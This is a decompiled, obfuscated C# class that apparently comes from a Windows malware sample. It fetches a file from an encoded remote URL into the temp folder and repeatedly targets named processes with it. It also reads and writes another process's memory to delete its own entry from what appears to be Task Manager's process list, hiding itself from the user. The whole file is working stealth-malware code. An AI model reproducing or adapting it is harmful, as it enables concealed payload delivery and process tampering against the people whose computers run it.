using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace frgoWklvEOSV;

internal sealed class PmZcbpYMQkkuHdO
{
	private struct egOYnMsXOTjl
	{
		public uint ZZFIMbxLgzthaR;

		public IntPtr BxHIHExIvxZU;

		public IntPtr YRofDNnXGicoWU;

		public uint oNjdwbdRHgy;

		public uint nmVNOKbSciLW;

		public IntPtr TDlIPygpdst;

		public uint rLBeAZCTznQk;

		public int NYhBjqLGSmMKnsl;

		public IntPtr nQYKRLEKQiaDAB;
	}

	private static volatile bool NPrbAlPzPDdY;

	public static volatile bool zsxmbThfoIv;

	[NonSerialized]
	internal static GetString getString_0;

	public static string swZUlVwSEWmJw()
	{
		if (IntPtr.Size == 8)
		{
			PFruJiQrcriiZ.KtQjokjXHZXUlt = vmqHVeneBD(new Uri(PFruJiQrcriiZ.GwTsezEgVAuVAU(getString_0(107401192))));
		}
		else
		{
			PFruJiQrcriiZ.KtQjokjXHZXUlt = vmqHVeneBD(new Uri(PFruJiQrcriiZ.GwTsezEgVAuVAU(getString_0(107400566))));
		}
		return PFruJiQrcriiZ.KtQjokjXHZXUlt;
	}

	public static string vmqHVeneBD(Uri uri_0)
	{
		try
		{
			string path = Path.GetRandomFileName().Replace(getString_0(107400388), getString_0(107388746)).Remove(0, 3) + getString_0(107400415);
			WebClient webClient = new WebClient();
			webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
			return Path.Combine(Path.GetTempPath(), path);
		}
		catch
		{
		}
		return string.Empty;
	}

	public static Process bZgooWszMxOy(string string_0)
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		Process process;
		while (true)
		{
			if (num < processes.Length)
			{
				process = processes[num];
				if (process.ProcessName.Contains(string_0))
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return process;
	}

	public static void xRTdqUJOGhXP(string[] string_0)
	{
		string text = swZUlVwSEWmJw();
		if (string.IsNullOrEmpty(text))
		{
			return;
		}
		while (true)
		{
			foreach (string string_ in string_0)
			{
				Process process = bZgooWszMxOy(string_);
				if (process != null)
				{
					string text2 = process.Id.ToString();
					PFruJiQrcriiZ.KXNiSRaxzeIpPt(text, text2 + getString_0(107386850) + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName));
					PFruJiQrcriiZ.KXNiSRaxzeIpPt(text, text2 + getString_0(107386850) + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName) + getString_0(107400406));
					PFruJiQrcriiZ.KXNiSRaxzeIpPt(text, text2 + getString_0(107386850) + PFruJiQrcriiZ.GwTsezEgVAuVAU(getString_0(107400365)));
					PFruJiQrcriiZ.KXNiSRaxzeIpPt(text, text2 + getString_0(107386850) + PFruJiQrcriiZ.GwTsezEgVAuVAU(getString_0(107387949)));
					PFruJiQrcriiZ.KXNiSRaxzeIpPt(text, text2 + getString_0(107386850) + PFruJiQrcriiZ.GwTsezEgVAuVAU(getString_0(107400372)));
					PFruJiQrcriiZ.KXNiSRaxzeIpPt(text, text2 + getString_0(107386850) + PFruJiQrcriiZ.GwTsezEgVAuVAU(getString_0(107400835)));
					PFruJiQrcriiZ.KXNiSRaxzeIpPt(text, text2 + getString_0(107386850) + PFruJiQrcriiZ.GwTsezEgVAuVAU(getString_0(107403449)));
					PFruJiQrcriiZ.KXNiSRaxzeIpPt(text, text2 + getString_0(107386850) + PFruJiQrcriiZ.GwTsezEgVAuVAU(getString_0(107400850)));
				}
			}
			Thread.Sleep(200);
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenProcess(int int_0, bool bool_0, uint uint_0);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0, int int_1);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool VirtualFreeEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CloseHandle(IntPtr ieOfaJizIolWkYn);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr uhimDKeNmQmB, IntPtr QKkbIiEcaFDJ, byte[] pNHDpIOupPgB, uint gpzdSQiksmHIiE, out UIntPtr vAUrzrCfCWv);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool ReadProcessMemory(IntPtr sqKIEGwqjOHW, IntPtr YeBimhgZRdrex, [Out] byte[] VdMDasJSmq, int GdhqiIqbxsvAnB, out UIntPtr EzOMAaxrSvh);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowThreadProcessId(IntPtr eUDWVbRwyKtmjb, out uint rGOQidRuPe);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern IntPtr SendMessage(IntPtr intptr_0, uint uint_0, IntPtr intptr_1, IntPtr intptr_2);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string string_0, string string_1);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr intptr_0, IntPtr intptr_1, string string_0, string string_1);

	private static byte[] VpkAJizyuaj(object object_0)
	{
		int num = Marshal.SizeOf(object_0);
		byte[] array = new byte[num];
		IntPtr intPtr = Marshal.AllocHGlobal(num);
		Marshal.StructureToPtr(object_0, intPtr, fDeleteOld: true);
		Marshal.Copy(intPtr, array, 0, num);
		Marshal.FreeHGlobal(intPtr);
		return array;
	}

	private static IntPtr rBaNxPzSfHF(uint uint_0)
	{
		return OpenProcess(56, bool_0: false, uint_0);
	}

	private static void YJhUDGPhSkbuEf(IntPtr intptr_0)
	{
		CloseHandle(intptr_0);
	}

	private static IntPtr YAqvBQGcLASTyDa(uint uint_0, IntPtr intptr_0)
	{
		return VirtualAllocEx(intptr_0, IntPtr.Zero, uint_0, 12288, 4);
	}

	private static void THoLmeHgblkyQDl(IntPtr intptr_0, IntPtr intptr_1, uint uint_0)
	{
		VirtualFreeEx(intptr_0, intptr_1, uint_0, 32768);
	}

	private static IntPtr wpcUcLrVrFbBPg()
	{
		IntPtr intPtr = FindWindow(getString_0(107400801), getString_0(107400776));
		if (intPtr == IntPtr.Zero)
		{
			intPtr = FindWindow(getString_0(107400743), getString_0(107400766));
			intPtr = FindWindowEx(intPtr, IntPtr.Zero, getString_0(107400743), null);
			return FindWindowEx(intPtr, IntPtr.Zero, getString_0(107400717), getString_0(107400728));
		}
		intPtr = FindWindowEx(intPtr, IntPtr.Zero, getString_0(107400743), null);
		return FindWindowEx(intPtr, IntPtr.Zero, getString_0(107400717), getString_0(107400683));
	}

	private static IntPtr VRSjNGIqMPxxrf(IntPtr intptr_0)
	{
		return SendMessage(intptr_0, 4100u, IntPtr.Zero, IntPtr.Zero);
	}

	private static void sovqNCrbRXgkN(IntPtr intptr_0, IntPtr intptr_1)
	{
		SendMessage(intptr_0, 4104u, intptr_1, IntPtr.Zero);
	}

	private static void FQsCBkWkZKJYOA(IntPtr intptr_0)
	{
		SendMessage(intptr_0, 4124u, IntPtr.Zero, IntPtr.Zero);
	}

	private static string MRonfAkACEl(IntPtr intptr_0, IntPtr intptr_1)
	{
		byte[] array = new byte[50];
		egOYnMsXOTjl egOYnMsXOTjl = default(egOYnMsXOTjl);
		GetWindowThreadProcessId(intptr_0, out var rGOQidRuPe);
		IntPtr intPtr = rBaNxPzSfHF(rGOQidRuPe);
		IntPtr intPtr2 = YAqvBQGcLASTyDa((uint)Marshal.SizeOf(egOYnMsXOTjl), intPtr);
		IntPtr intPtr3 = YAqvBQGcLASTyDa(50u, intPtr);
		egOYnMsXOTjl.BxHIHExIvxZU = intptr_1;
		egOYnMsXOTjl.YRofDNnXGicoWU = (IntPtr)0;
		egOYnMsXOTjl.rLBeAZCTznQk = 50u;
		egOYnMsXOTjl.TDlIPygpdst = intPtr3;
		WriteProcessMemory(intPtr, intPtr2, VpkAJizyuaj(egOYnMsXOTjl), (uint)Marshal.SizeOf(egOYnMsXOTjl), out var vAUrzrCfCWv);
		SendMessage(intptr_0, 4141u, intptr_1, intPtr2);
		ReadProcessMemory(intPtr, intPtr3, array, 50, out vAUrzrCfCWv);
		THoLmeHgblkyQDl(intPtr, intPtr2, (uint)Marshal.SizeOf(egOYnMsXOTjl));
		THoLmeHgblkyQDl(intPtr, intPtr3, 50u);
		YJhUDGPhSkbuEf(intPtr);
		return Encoding.ASCII.GetString(array);
	}

	private static void eYeipYCyEPEx(string string_0)
	{
		IntPtr intPtr = wpcUcLrVrFbBPg();
		if (!(intPtr != IntPtr.Zero))
		{
			return;
		}
		int num = (int)VRSjNGIqMPxxrf(intPtr);
		for (int i = 0; i < num; i++)
		{
			string text = MRonfAkACEl(intPtr, (IntPtr)i);
			if (text.Contains(string_0))
			{
				sovqNCrbRXgkN(intPtr, (IntPtr)i);
			}
		}
	}

	private static void RkWwqjeVZT()
	{
		IntPtr intPtr = wpcUcLrVrFbBPg();
		if (intPtr != IntPtr.Zero)
		{
			FQsCBkWkZKJYOA(intPtr);
			FQsCBkWkZKJYOA(intPtr);
			FQsCBkWkZKJYOA(intPtr);
			FQsCBkWkZKJYOA(intPtr);
			FQsCBkWkZKJYOA(intPtr);
		}
	}

	public static void SmzpdOGqBUsqf()
	{
		Thread thread = new Thread(YuQxyPaMUrM);
		thread.Start();
	}

	private static void YuQxyPaMUrM()
	{
		while (!NPrbAlPzPDdY)
		{
			if (zsxmbThfoIv)
			{
				eYeipYCyEPEx(Process.GetCurrentProcess().ProcessName + getString_0(107400415));
				Thread.Sleep(525);
			}
			else
			{
				RkWwqjeVZT();
				Thread.Sleep(1000);
			}
		}
		NPrbAlPzPDdY = false;
	}

	static PmZcbpYMQkkuHdO()
	{
		Strings.CreateGetStringDelegate(typeof(PmZcbpYMQkkuHdO));
		NPrbAlPzPDdY = false;
		zsxmbThfoIv = true;
	}
}
